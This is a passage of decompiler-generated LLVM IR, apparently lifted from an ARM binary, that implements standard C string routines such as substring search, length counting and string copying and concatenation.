  uselistorder i32 %v0_13fe4, { 1, 0 }
  uselistorder label %dec_label_pc_13ff4, { 1, 0 }
}

define i32 @function_14000() local_unnamed_addr {
dec_label_pc_14000:
  %v0_14000 = load i32, i32* @r0, align 4
  %v1_14000 = load i32, i32* @r1, align 4
  %v2_14000 = inttoptr i32 %v0_14000 to i8*
  %v3_14000 = call i32 @function_198c0(i8* %v2_14000, i32 %v1_14000)
  ret i32 %v3_14000
}

define i32 @function_14010(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14010:
  store i32 %arg1, i32* @r2, align 4
  %v0_14018 = load i32, i32* @r0, align 4
  %v2_14018 = inttoptr i32 %v0_14018 to i8*
  %v3_14018 = call i32 @function_13ed0(i8* %v2_14018, i32 0)
  ret i32 %v3_14018
}

define i32 @function_14020(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_14020:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_14024 = load i8, i8* %arg2, align 1
  %v2_14028 = icmp eq i8 %v3_14024, 0
  %v1_14118.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_14028, label %dec_label_pc_14114, label %dec_label_pc_14030

dec_label_pc_14030:                               ; preds = %dec_label_pc_14020
  %v1_14030 = add i32 %v1_14118.pre, -1
  store i32 %v1_14030, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14034

dec_label_pc_14034:                               ; preds = %dec_label_pc_14040, %dec_label_pc_14030
  %v0_14034 = phi i32 [ %v1_14034, %dec_label_pc_14040 ], [ %v1_14030, %dec_label_pc_14030 ]
  %v1_14034 = add i32 %v0_14034, 1
  %v2_14034 = inttoptr i32 %v1_14034 to i8*
  %v3_14034 = load i8, i8* %v2_14034, align 1
  store i32 %v1_14034, i32* %r0.global-to-local, align 4
  %v2_14038 = icmp eq i8 %v3_14034, 0
  br i1 %v2_14038, label %dec_label_pc_14110, label %dec_label_pc_14040

dec_label_pc_14040:                               ; preds = %dec_label_pc_14034
  %v9_14040 = icmp eq i8 %v3_14034, %v3_14024
  br i1 %v9_14040, label %dec_label_pc_14048, label %dec_label_pc_14034

dec_label_pc_14048:                               ; preds = %dec_label_pc_14040
  %v2_14048 = add i32 %tmp, 1
  %v3_14048 = inttoptr i32 %v2_14048 to i8*
  %v4_14048 = load i8, i8* %v3_14048, align 1
  %v2_1404c = icmp eq i8 %v4_14048, 0
  br i1 %v2_1404c, label %dec_label_pc_14114, label %dec_label_pc_14058

dec_label_pc_14058:                               ; preds = %dec_label_pc_14048
  %v1_14058 = add i32 %v0_14034, 2
  %v1_140ac = add i32 %tmp, 2
  %v2_140ac = inttoptr i32 %v1_140ac to i8*
  br label %dec_label_pc_140a4

dec_label_pc_14068:                               ; preds = %dec_label_pc_14104
  %v3_14068 = load i8, i8* %v3_1409c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14094.preheader

dec_label_pc_14094.preheader:                     ; preds = %dec_label_pc_14068, %dec_label_pc_140a4
  %v0_140943.in = phi i8 [ %v3_14068, %dec_label_pc_14068 ], [ %v3_1409c.pn, %dec_label_pc_140a4 ]
  %v9_1409412 = icmp eq i8 %v0_140943.in, %v3_14024
  br i1 %v9_1409412, label %dec_label_pc_1409c, label %dec_label_pc_14074

dec_label_pc_14074:                               ; preds = %dec_label_pc_14094.preheader, %dec_label_pc_14090
  %v0_1407c = phi i32 [ %v1_14090, %dec_label_pc_14090 ], [ %storemerge41, %dec_label_pc_14094.preheader ]
  %v0_14074.in = phi i8 [ %v3_14090, %dec_label_pc_14090 ], [ %v0_140943.in, %dec_label_pc_14094.preheader ]
  %v2_14074 = icmp eq i8 %v0_14074.in, 0
  br i1 %v2_14074, label %dec_label_pc_14110, label %dec_label_pc_1407c

dec_label_pc_1407c:                               ; preds = %dec_label_pc_14074
  %v1_1407c = add i32 %v0_1407c, 1
  %v2_1407c = inttoptr i32 %v1_1407c to i8*
  %v3_1407c = load i8, i8* %v2_1407c, align 1
  store i32 %v1_1407c, i32* %r0.global-to-local, align 4
  %v9_14080 = icmp eq i8 %v3_1407c, %v3_14024
  br i1 %v9_14080, label %dec_label_pc_1409c, label %dec_label_pc_14088

dec_label_pc_14088:                               ; preds = %dec_label_pc_1407c
  %v2_14088 = icmp eq i8 %v3_1407c, 0
  br i1 %v2_14088, label %dec_label_pc_14110, label %dec_label_pc_14090

dec_label_pc_14090:                               ; preds = %dec_label_pc_14088
  %v1_14090 = add i32 %v0_1407c, 2
  %v2_14090 = inttoptr i32 %v1_14090 to i8*
  %v3_14090 = load i8, i8* %v2_14090, align 1
  store i32 %v1_14090, i32* %r0.global-to-local, align 4
  %v9_14094 = icmp eq i8 %v3_14090, %v3_14024
  br i1 %v9_14094, label %dec_label_pc_1409c, label %dec_label_pc_14074

dec_label_pc_1409c:                               ; preds = %dec_label_pc_1407c, %dec_label_pc_14090, %dec_label_pc_14094.preheader
  %v0_1409c = phi i32 [ %storemerge41, %dec_label_pc_14094.preheader ], [ %v1_1407c, %dec_label_pc_1407c ], [ %v1_14090, %dec_label_pc_14090 ]
  %v1_1409c = add i32 %v0_1409c, 1
  br label %dec_label_pc_140a4

dec_label_pc_140a4:                               ; preds = %dec_label_pc_14058, %dec_label_pc_1409c
  %storemerge41 = phi i32 [ %v1_1409c, %dec_label_pc_1409c ], [ %v1_14058, %dec_label_pc_14058 ]
  %v3_1409c.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_1409c.pn = load i8, i8* %v3_1409c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_1409c.pn, %v4_14048
  br i1 %storemerge, label %dec_label_pc_140a8, label %dec_label_pc_14094.preheader

dec_label_pc_140a8:                               ; preds = %dec_label_pc_140a4
  %v1_140a8 = add i32 %storemerge41, 1
  %v2_140a8 = inttoptr i32 %v1_140a8 to i8*
  %v3_140a8 = load i8, i8* %v2_140a8, align 1
  %v4_140a8 = zext i8 %v3_140a8 to i32
  %v3_140ac = load i8, i8* %v2_140ac, align 1
  %v4_140ac = zext i8 %v3_140ac to i32
  %v9_140b4 = icmp eq i8 %v3_140a8, %v3_140ac
  %v1_140bc = add i32 %storemerge41, -1
  store i32 %v1_140bc, i32* %r0.global-to-local, align 4
  br i1 %v9_140b4, label %dec_label_pc_140c4, label %dec_label_pc_14104

dec_label_pc_140c4:                               ; preds = %dec_label_pc_140a8, %dec_label_pc_140f4
  %v0_140dc = phi i32 [ %v1_140e4, %dec_label_pc_140f4 ], [ %v1_140ac, %dec_label_pc_140a8 ]
  %v0_140d4 = phi i32 [ %v1_140e0, %dec_label_pc_140f4 ], [ %v1_140a8, %dec_label_pc_140a8 ]
  %v0_140c4 = phi i32 [ %v4_140f4, %dec_label_pc_140f4 ], [ %v4_140a8, %dec_label_pc_140a8 ]
  %v2_140c4 = icmp eq i32 %v0_140c4, 0
  br i1 %v2_140c4, label %dec_label_pc_14114, label %dec_label_pc_140cc

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140c4
  %v1_140cc = add i32 %v0_140d4, 1
  %v2_140cc = inttoptr i32 %v1_140cc to i8*
  %v3_140cc = load i8, i8* %v2_140cc, align 1
  %v1_140d0 = add i32 %v0_140dc, 1
  %v2_140d0 = inttoptr i32 %v1_140d0 to i8*
  %v3_140d0 = load i8, i8* %v2_140d0, align 1
  %v4_140d0 = zext i8 %v3_140d0 to i32
  %v9_140d8 = icmp eq i8 %v3_140cc, %v3_140d0
  %v1_140e0 = add i32 %v0_140d4, 2
  %v1_140e4 = add i32 %v0_140dc, 2
  br i1 %v9_140d8, label %dec_label_pc_140ec, label %dec_label_pc_14104

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140cc
  %v2_140ec = icmp eq i8 %v3_140cc, 0
  br i1 %v2_140ec, label %dec_label_pc_14114, label %dec_label_pc_140f4

dec_label_pc_140f4:                               ; preds = %dec_label_pc_140ec
  %v2_140f4 = inttoptr i32 %v1_140e4 to i8*
  %v3_140f4 = load i8, i8* %v2_140f4, align 1
  %v4_140f4 = zext i8 %v3_140f4 to i32
  %v2_140f8 = inttoptr i32 %v1_140e0 to i8*
  %v3_140f8 = load i8, i8* %v2_140f8, align 1
  %v9_140fc = icmp eq i8 %v3_140f8, %v3_140f4
  br i1 %v9_140fc, label %dec_label_pc_140c4, label %dec_label_pc_14104

dec_label_pc_14104:                               ; preds = %dec_label_pc_140f4, %dec_label_pc_140cc, %dec_label_pc_140a8
  %v0_14104 = phi i32 [ %v4_140ac, %dec_label_pc_140a8 ], [ %v4_140f4, %dec_label_pc_140f4 ], [ %v4_140d0, %dec_label_pc_140cc ]
  %v2_14104 = icmp eq i32 %v0_14104, 0
  br i1 %v2_14104, label %dec_label_pc_14114, label %dec_label_pc_14068

dec_label_pc_14110:                               ; preds = %dec_label_pc_14034, %dec_label_pc_14088, %dec_label_pc_14074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_14104, %dec_label_pc_140ec, %dec_label_pc_140c4, %dec_label_pc_14020, %dec_label_pc_14048, %dec_label_pc_14110
  %v1_14118 = phi i32 [ %v1_14034, %dec_label_pc_14048 ], [ 0, %dec_label_pc_14110 ], [ %v1_14118.pre, %dec_label_pc_14020 ], [ %v1_140bc, %dec_label_pc_140c4 ], [ %v1_140bc, %dec_label_pc_140ec ], [ %v1_140bc, %dec_label_pc_14104 ]
  ret i32 %v1_14118

; uselistorder directives
  uselistorder i32 %v1_140e0, { 1, 0 }
  uselistorder i8 %v3_1409c.pn, { 1, 0 }
  uselistorder i8* %v3_1409c.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_14090, { 1, 0 }
  uselistorder i32 %v1_14090, { 0, 2, 3, 1 }
  uselistorder i32 %v1_14034, { 0, 2, 3, 1 }
  uselistorder i8 %v3_14024, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 2, 6, 7, 4, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_14114, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_14110, { 1, 2, 0 }
  uselistorder label %dec_label_pc_140c4, { 1, 0 }
  uselistorder label %dec_label_pc_140a4, { 1, 0 }
  uselistorder label %dec_label_pc_1409c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14074, { 1, 0 }
  uselistorder label %dec_label_pc_14094.preheader, { 1, 0 }
}

define i32 @function_1411c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1411c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1411c = icmp eq i32 %arg2, 0
  br i1 %v2_1411c, label %bb, label %dec_label_pc_14130

bb:                                               ; preds = %dec_label_pc_1411c
  br label %bb25

dec_label_pc_14130:                               ; preds = %dec_label_pc_1411c
  %v2_14130 = add i32 %tmp, %arg2
  %v3_14130 = icmp ult i32 %v2_14130, %tmp
  br i1 %v3_14130, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_14130
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14130, %bb19
  %v5_141d0 = phi i32 [ %v2_14130, %dec_label_pc_14130 ], [ -1, %bb19 ]
  %v1_141504 = urem i32 %tmp, 4
  %v2_141505 = icmp eq i32 %v1_141504, 0
  br i1 %v2_141505, label %dec_label_pc_14158, label %dec_label_pc_14140

dec_label_pc_14140:                               ; preds = %bb20, %dec_label_pc_1414c
  %v0_1414c = phi i32 [ %v1_1414c, %dec_label_pc_1414c ], [ %tmp, %bb20 ]
  %v1_14140 = inttoptr i32 %v0_1414c to i8*
  %v2_14140 = load i8, i8* %v1_14140, align 1
  %v2_14144 = icmp eq i8 %v2_14140, 0
  br i1 %v2_14144, label %dec_label_pc_141cc, label %dec_label_pc_1414c

dec_label_pc_1414c:                               ; preds = %dec_label_pc_14140
  %v1_1414c = add i32 %v0_1414c, 1
  %v1_14150 = urem i32 %v1_1414c, 4
  %v2_14150 = icmp eq i32 %v1_14150, 0
  br i1 %v2_14150, label %dec_label_pc_14158, label %dec_label_pc_14140

dec_label_pc_14158:                               ; preds = %dec_label_pc_1414c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_1414c, %dec_label_pc_1414c ]
  %v3_141bc30 = icmp ult i32 %storemerge.lcssa, %v5_141d0
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_141bc30, label %dec_label_pc_14160, label %dec_label_pc_141cc

dec_label_pc_14160:                               ; preds = %dec_label_pc_141b8, %dec_label_pc_14158
  %v0_141b037 = phi i32 [ %v4_14160, %dec_label_pc_141b8 ], [ %storemerge.lcssa, %dec_label_pc_14158 ]
  %v1_14160 = inttoptr i32 %v0_141b037 to i32*
  %v2_14160 = load i32, i32* %v1_14160, align 4
  %v4_14160 = add i32 %v0_141b037, 4
  %v2_14164 = add i32 %v2_14160, -16843009
  %v2_14168 = and i32 %v2_14164, -2139062144
  store i32 %v2_14168, i32* @ip, align 4
  %v2_1416c = icmp eq i32 %v2_14168, 0
  br i1 %v2_1416c, label %dec_label_pc_141b8, label %dec_label_pc_14174

dec_label_pc_14174:                               ; preds = %dec_label_pc_14160
  %v2_14174 = inttoptr i32 %v0_141b037 to i8*
  %v3_14174 = load i8, i8* %v2_14174, align 1
  %v2_14178 = icmp eq i8 %v3_14174, 0
  br i1 %v2_14178, label %bb21, label %dec_label_pc_14188

bb21:                                             ; preds = %dec_label_pc_14174
  br label %dec_label_pc_141cc

dec_label_pc_14188:                               ; preds = %dec_label_pc_14174
  %v1_14188 = add i32 %v0_141b037, 1
  %v2_14188 = inttoptr i32 %v1_14188 to i8*
  %v3_14188 = load i8, i8* %v2_14188, align 1
  %v2_1418c = icmp eq i8 %v3_14188, 0
  br i1 %v2_1418c, label %dec_label_pc_141cc, label %dec_label_pc_14198

dec_label_pc_14198:                               ; preds = %dec_label_pc_14188
  %v1_14198 = add i32 %v0_141b037, 2
  %v2_14198 = inttoptr i32 %v1_14198 to i8*
  %v3_14198 = load i8, i8* %v2_14198, align 1
  %v2_1419c = icmp eq i8 %v3_14198, 0
  br i1 %v2_1419c, label %dec_label_pc_141cc, label %dec_label_pc_141a8

dec_label_pc_141a8:                               ; preds = %dec_label_pc_14198
  %v1_141a8 = add i32 %v0_141b037, 3
  %v2_141a8 = inttoptr i32 %v1_141a8 to i8*
  %v3_141a8 = load i8, i8* %v2_141a8, align 1
  %v2_141ac = icmp eq i8 %v3_141a8, 0
  br i1 %v2_141ac, label %dec_label_pc_141cc, label %dec_label_pc_141b8

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141a8, %dec_label_pc_14160
  %v3_141bc = icmp ult i32 %v4_14160, %v5_141d0
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_141bc, label %dec_label_pc_14160, label %dec_label_pc_141cc

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141b8, %dec_label_pc_14158, %dec_label_pc_14140, %dec_label_pc_14188, %dec_label_pc_14198, %dec_label_pc_141a8, %bb21
  %v1_141cc = phi i32 [ %v0_141b037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_14158 ], [ %v1_14188, %dec_label_pc_14188 ], [ %v1_14198, %dec_label_pc_14198 ], [ %v1_141a8, %dec_label_pc_141a8 ], [ %v5_141d0, %dec_label_pc_141b8 ], [ %v0_1414c, %dec_label_pc_14140 ]
  %v3_141cc = icmp uge i32 %v5_141d0, %v1_141cc
  %v9_141cc = icmp eq i32 %v5_141d0, %v1_141cc
  %v2_141d0 = xor i1 %v3_141cc, true
  %v3_141d0 = or i1 %v9_141cc, %v2_141d0
  br i1 %v3_141d0, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_141cc
  %v6_141d0 = sub i32 %v5_141d0, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_141cc, %bb22
  %v5_141d4 = phi i32 [ %v1_141cc, %dec_label_pc_141cc ], [ %v6_141d0, %bb22 ]
  %v2_141d4 = xor i1 %v9_141cc, true
  %v3_141d4 = and i1 %v3_141cc, %v2_141d4
  br i1 %v3_141d4, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_141d4 = sub i32 %v5_141d4, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_141dc = phi i32 [ 0, %bb ], [ %v5_141d4, %bb23 ], [ %v6_141d4, %bb24 ]
  ret i32 %v1_141dc

; uselistorder directives
  uselistorder i1 %v3_141cc, { 1, 0 }
  uselistorder i32 %v4_14160, { 1, 0 }
  uselistorder i32 %v0_141b037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1414c, { 1, 0, 2 }
  uselistorder i32 %v5_141d0, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_141cc, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_14140, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_141e8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_141e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %dec_label_pc_141ec, %dec_label_pc_141e8
  %v0_141ec = phi i32 [ %v5_141ec, %dec_label_pc_141ec ], [ %tmp, %dec_label_pc_141e8 ]
  %v1_141ec = inttoptr i32 %v0_141ec to i8*
  %v2_141ec = load i8, i8* %v1_141ec, align 1
  %v5_141ec = add i32 %v0_141ec, 1
  store i32 %v5_141ec, i32* %r2.global-to-local, align 4
  %v2_141f0 = icmp eq i8 %v2_141ec, 0
  store i1 %v2_141f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141f0, label %dec_label_pc_141f8, label %dec_label_pc_141ec

dec_label_pc_141f8:                               ; preds = %dec_label_pc_141ec
  %v1_141f8 = add i32 %v0_141ec, -1
  store i32 %v1_141f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_141fc

dec_label_pc_141fc:                               ; preds = %dec_label_pc_141fc, %dec_label_pc_141f8
  %v2_14204 = phi i32 [ %v6_14204, %dec_label_pc_141fc ], [ %v1_141f8, %dec_label_pc_141f8 ]
  %v0_141fc = load i32, i32* @r1, align 4
  %v1_141fc = inttoptr i32 %v0_141fc to i8*
  %v2_141fc = load i8, i8* %v1_141fc, align 1
  %v5_141fc = add i32 %v0_141fc, 1
  store i32 %v5_141fc, i32* @r1, align 4
  %v2_14200 = icmp eq i8 %v2_141fc, 0
  store i1 %v2_14200, i1* %cpsr_z.global-to-local, align 1
  %v3_14204 = add i32 %v2_14204, 1
  %v4_14204 = inttoptr i32 %v3_14204 to i8*
  store i8 %v2_141fc, i8* %v4_14204, align 1
  %v5_14204 = load i32, i32* %r2.global-to-local, align 4
  %v6_14204 = add i32 %v5_14204, 1
  store i32 %v6_14204, i32* %r2.global-to-local, align 4
  %v0_14208 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14208, label %dec_label_pc_1420c, label %dec_label_pc_141fc

dec_label_pc_1420c:                               ; preds = %dec_label_pc_141fc
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_14204, { 1, 0 }
  uselistorder i32 %v5_141ec, { 1, 0 }
  uselistorder i32 %v0_141ec, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @function_14210(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14210:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_142201 = load i32, i32* @r1, align 4
  %v1_142202 = inttoptr i32 %v0_142201 to i8*
  %v2_142203 = load i8, i8* %v1_142202, align 1
  %v2_142245 = icmp eq i8 %v2_142203, 0
  store i1 %v2_142245, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_142203, i8* %arg1, align 1
  br i1 %v2_142245, label %dec_label_pc_14230, label %dec_label_pc_14218

dec_label_pc_14218:                               ; preds = %dec_label_pc_14210, %dec_label_pc_14218
  %v0_14218 = load i32, i32* @r1, align 4
  %v1_14218 = add i32 %v0_14218, 1
  store i32 %v1_14218, i32* @r1, align 4
  %v0_1421c = load i32, i32* %r2.global-to-local, align 4
  %v1_1421c = add i32 %v0_1421c, 1
  store i32 %v1_1421c, i32* %r2.global-to-local, align 4
  %v1_14220 = inttoptr i32 %v1_14218 to i8*
  %v2_14220 = load i8, i8* %v1_14220, align 1
  %v2_14224 = icmp eq i8 %v2_14220, 0
  store i1 %v2_14224, i1* %cpsr_z.global-to-local, align 1
  %v3_14228 = inttoptr i32 %v1_1421c to i8*
  store i8 %v2_14220, i8* %v3_14228, align 1
  %v0_1422c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1422c, label %dec_label_pc_14230, label %dec_label_pc_14218

dec_label_pc_14230:                               ; preds = %dec_label_pc_14218, %dec_label_pc_14210
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14218, { 1, 0 }
}

define i32 @function_14234(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14234:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_14234 = icmp eq i32 %arg2, 3
  store i1 %v7_14234, i1* %cpsr_z.global-to-local, align 1
  %v0_14238 = load i32, i32* @lr, align 4
  store i32 %v0_14238, i32* %stack_var_-4, align 4
  %v1_1423c = add i32 %arg1, -1
  store i32 %v1_1423c, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_142b8, label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %dec_label_pc_14234
  %v3_14244 = udiv i32 %arg2, 4
  store i32 %v3_14244, i32* %lr.global-to-local, align 4
  %v0_14248.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %dec_label_pc_14294, %dec_label_pc_14244
  %v2_14250 = phi i32 [ %v6_14288, %dec_label_pc_14294 ], [ %v1_1423c, %dec_label_pc_14244 ]
  %v0_14248 = phi i32 [ %v1_14298, %dec_label_pc_14294 ], [ %v0_14248.pre, %dec_label_pc_14244 ]
  %v1_14248 = inttoptr i32 %v0_14248 to i8*
  %v2_14248 = load i8, i8* %v1_14248, align 1
  %v3_14248 = zext i8 %v2_14248 to i32
  store i32 %v3_14248, i32* %r3.global-to-local, align 4
  %v2_1424c = icmp eq i8 %v2_14248, 0
  store i1 %v2_1424c, i1* %cpsr_z.global-to-local, align 1
  %v3_14250 = add i32 %v2_14250, 1
  %v4_14250 = inttoptr i32 %v3_14250 to i8*
  store i8 %v2_14248, i8* %v4_14250, align 1
  %v5_14250 = load i32, i32* @ip, align 4
  %v6_14250 = add i32 %v5_14250, 1
  store i32 %v6_14250, i32* @ip, align 4
  %v0_14254 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14254, label %dec_label_pc_142a4, label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %dec_label_pc_14248
  %v0_14258 = load i32, i32* @r1, align 4
  %v1_14258 = add i32 %v0_14258, 1
  %v2_14258 = inttoptr i32 %v1_14258 to i8*
  %v3_14258 = load i8, i8* %v2_14258, align 1
  %v4_14258 = zext i8 %v3_14258 to i32
  store i32 %v4_14258, i32* %r3.global-to-local, align 4
  %v2_1425c = icmp eq i8 %v3_14258, 0
  store i1 %v2_1425c, i1* %cpsr_z.global-to-local, align 1
  %v3_14260 = add i32 %v5_14250, 2
  %v4_14260 = inttoptr i32 %v3_14260 to i8*
  store i8 %v3_14258, i8* %v4_14260, align 1
  %v5_14260 = load i32, i32* @ip, align 4
  %v6_14260 = add i32 %v5_14260, 1
  store i32 %v6_14260, i32* @ip, align 4
  %v0_14264 = load i32, i32* @r1, align 4
  %v1_14264 = add i32 %v0_14264, 1
  store i32 %v1_14264, i32* %r1.global-to-local, align 4
  %v0_14268 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14268, label %dec_label_pc_142a4, label %dec_label_pc_1426c

dec_label_pc_1426c:                               ; preds = %dec_label_pc_14258
  %v1_1426c = add i32 %v0_14264, 2
  %v2_1426c = inttoptr i32 %v1_1426c to i8*
  %v3_1426c = load i8, i8* %v2_1426c, align 1
  %v4_1426c = zext i8 %v3_1426c to i32
  store i32 %v4_1426c, i32* %r3.global-to-local, align 4
  %v2_14270 = icmp eq i8 %v3_1426c, 0
  store i1 %v2_14270, i1* %cpsr_z.global-to-local, align 1
  %v3_14274 = add i32 %v5_14260, 2
  %v4_14274 = inttoptr i32 %v3_14274 to i8*
  store i8 %v3_1426c, i8* %v4_14274, align 1
  %v5_14274 = load i32, i32* @ip, align 4
  %v6_14274 = add i32 %v5_14274, 1
  store i32 %v6_14274, i32* @ip, align 4
  %v0_14278 = load i32, i32* %r1.global-to-local, align 4
  %v1_14278 = add i32 %v0_14278, 1
  store i32 %v1_14278, i32* %r1.global-to-local, align 4
  %v0_1427c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1427c, label %dec_label_pc_142a4, label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_1426c
  %v1_14280 = add i32 %v0_14278, 2
  %v2_14280 = inttoptr i32 %v1_14280 to i8*
  %v3_14280 = load i8, i8* %v2_14280, align 1
  %v4_14280 = zext i8 %v3_14280 to i32
  store i32 %v4_14280, i32* %r3.global-to-local, align 4
  %v2_14284 = icmp eq i8 %v3_14280, 0
  store i1 %v2_14284, i1* %cpsr_z.global-to-local, align 1
  %v3_14288 = add i32 %v5_14274, 2
  %v4_14288 = inttoptr i32 %v3_14288 to i8*
  store i8 %v3_14280, i8* %v4_14288, align 1
  %v5_14288 = load i32, i32* @ip, align 4
  %v6_14288 = add i32 %v5_14288, 1
  store i32 %v6_14288, i32* @ip, align 4
  %v0_1428c = load i32, i32* %r1.global-to-local, align 4
  %v1_1428c = add i32 %v0_1428c, 1
  store i32 %v1_1428c, i32* %r1.global-to-local, align 4
  %v0_14290 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14290, label %dec_label_pc_142a4, label %dec_label_pc_14294

dec_label_pc_14294:                               ; preds = %dec_label_pc_14280
  %v0_14294 = load i32, i32* %lr.global-to-local, align 4
  %v1_14294 = add i32 %v0_14294, -1
  store i32 %v1_14294, i32* %lr.global-to-local, align 4
  %v7_14294 = icmp eq i32 %v0_14294, 1
  store i1 %v7_14294, i1* %cpsr_z.global-to-local, align 1
  %v1_14298 = add i32 %v0_1428c, 2
  store i32 %v1_14298, i32* @r1, align 4
  br i1 %v7_14294, label %dec_label_pc_142b8, label %dec_label_pc_14248

dec_label_pc_142a4:                               ; preds = %dec_label_pc_14280, %dec_label_pc_1426c, %dec_label_pc_14258, %dec_label_pc_14248
  %v1_142a4 = phi i32 [ %v6_14288, %dec_label_pc_14280 ], [ %v6_14274, %dec_label_pc_1426c ], [ %v6_14260, %dec_label_pc_14258 ], [ %v6_14250, %dec_label_pc_14248 ]
  %v2_142a41 = sub i32 %arg1, %v1_142a4
  %v2_142a8 = add i32 %v2_142a41, %arg2
  %v1_142ac = add i32 %v2_142a8, -1
  store i32 %v1_142ac, i32* %r3.global-to-local, align 4
  %v7_142ac = icmp eq i32 %v2_142a8, 1
  store i1 %v7_142ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_142ac, label %dec_label_pc_142e8, label %dec_label_pc_142d8

dec_label_pc_142b8:                               ; preds = %dec_label_pc_14294, %dec_label_pc_14234
  %v2_142c87 = phi i32 [ %v1_1423c, %dec_label_pc_14234 ], [ %v6_14288, %dec_label_pc_14294 ]
  %v1_142b8 = urem i32 %arg2, 4
  store i32 %v1_142b8, i32* %r3.global-to-local, align 4
  %v2_142b8 = icmp eq i32 %v1_142b8, 0
  store i1 %v2_142b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142b8, label %dec_label_pc_142e8, label %dec_label_pc_142c0

dec_label_pc_142c0:                               ; preds = %dec_label_pc_142b8, %dec_label_pc_142d0.dec_label_pc_142c0_crit_edge
  %v2_142c8 = phi i32 [ %v6_142c8, %dec_label_pc_142d0.dec_label_pc_142c0_crit_edge ], [ %v2_142c87, %dec_label_pc_142b8 ]
  %v0_142c4 = phi i32 [ %v0_142c4.pre, %dec_label_pc_142d0.dec_label_pc_142c0_crit_edge ], [ %v1_142b8, %dec_label_pc_142b8 ]
  %v0_142c0 = load i32, i32* @r1, align 4
  %v1_142c0 = inttoptr i32 %v0_142c0 to i8*
  %v2_142c0 = load i8, i8* %v1_142c0, align 1
  %v3_142c0 = zext i8 %v2_142c0 to i32
  store i32 %v3_142c0, i32* %r2.global-to-local, align 4
